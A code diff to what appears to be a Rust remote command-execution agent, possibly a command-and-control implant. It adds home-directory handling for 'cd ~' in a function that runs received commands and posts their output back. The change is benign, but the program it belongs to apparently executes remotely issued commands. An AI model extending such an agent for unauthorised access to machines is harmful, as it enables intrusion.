@@ -9,6 +9,7 @@ use std::env::set_current_dir;
 use std::path::Path;
 use wait_timeout::ChildExt;
 use std::io::Read;
+use dirs;
 
 use pnet_datalink::interfaces;
 
@@ -102,7 +103,13 @@ fn handle_command(cmd_id:&str, command:&str, identifier: &str){
         }
         if command[..=1].eq("cd") { //if the first two letters are cd
             let path = Path::new(&command[3..]); //the path is the remaining
-            set_current_dir(path);
+            if &command[3..] == "~"{
+                let home = dirs::home_dir().unwrap();
+                set_current_dir(home);
+            }
+            else{
+                set_current_dir(path);
+            }
             let cmd_out = &run_command(&"pwd");
             post_response(&cmd_id, &cmd_out, &identifier);
         } else{
